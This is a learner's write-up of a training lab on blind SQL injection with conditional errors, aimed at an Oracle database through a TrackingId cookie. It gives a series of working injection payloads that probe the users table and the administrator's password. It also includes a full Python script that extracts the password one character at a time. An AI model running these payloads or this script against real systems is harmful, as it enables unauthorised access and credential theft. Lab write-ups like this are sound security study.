## Lab 12 - Blind SQL injection with conditional errors

**SQL Injection at** - TrackingId Cookie  
**End Goal** - Find password for the administrator user.

---
### Analysis:  
We are not getting any changes in the response for correct or incorrect inputs in TrackingId. meaning even if i add random value it gives status 200.

- `'` gives a *500 internal server error* and `''` gives `200 OK`  
-> Means it is processing our sql query and maybe vulnerable to sqli.  

So to get information about the database we cannot rely on different responses but we can make the query throw a database error if something does exist and make it respond noramally if something doesn't exist, making it similar to previous lab.

- TrackingId=xyz`' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`

This payload uses `CASE`, it's similar to if else logic in programming, here we are saying `When 1=2` (which can't be true), then divide 1 by 0 (that will throw an error), or else return `'a'`, so here because 1 is not equals to 2 it will go to else part and return `'a'` and then it will get compared with the `'a'` which will return true, similar to Lab 11.

But here this payload gives *500 internal server error* but it shouldn't because here it will return a=a that should be true.

- Okay we got from hint that it's a Oracle database so we use oracle specific payload.
- TrackingId=xyz`' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='a` this gives us `status code 200`  
    -   *In SQL, NULL represents an unknown value. Here in this condition, SQL evaluates `NULL = 'a'` as UNKNOWN (or NULL). so it doesn't throw an error that is why it gives status code 200*

- TrackingId=xyz`' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)='a`  
-> This Payload gives us *500 internal server error*.

**Now we are getting error for different conditions so we can continue to check for more things.**

- TrackingId=xyz`' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users) ||'`  
**This changes the logic completely** - So here the `FROM users` executes first, so if users table exists then `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END` statement will run, that is `1=1` that will always be true so it will do `1/0` which wil throw an error. means the user table does exist.  
If the users table does not exist the whole 'SELECT' statement will not run at all.  
  
- TrackingId=xyz`' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'`  
-> Returns *-- 500 Internal Server Error --* confirming there exists a username called administrator.  
  
- TrackingId=xyz`' || (SELECT CASE WHEN LENGTH(password)>5 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'`  
-> Returns  *-- 500 Internal Server Error --* We already know administrator exists so we can test the password condition in the *SELECT* query, and 500 code confirms that password is greater than 5.  
-> The length of the password is 20.  
  
- TrackingId=xyz`' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'`  

Used a python script to extract the 20 character password of the administrator.

The Script:
```py
import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(48,122):
            sqli_payload = "' || (SELECT CASE WHEN ascii(SUBSTR(password,%s,1))='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': '0W99Yo2r2kuyuXQL' + sqli_payload_encoded, 'session': 'gDxQnj456MA0Jgnf1BocoMnqAi5qWdmJ'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
```
The Command to Run the Script:
```py
python <script.py> "https://Lab-URL/"
```
-> Got the Password in under 2-3 minutes.

- Login as the administrator user using the password.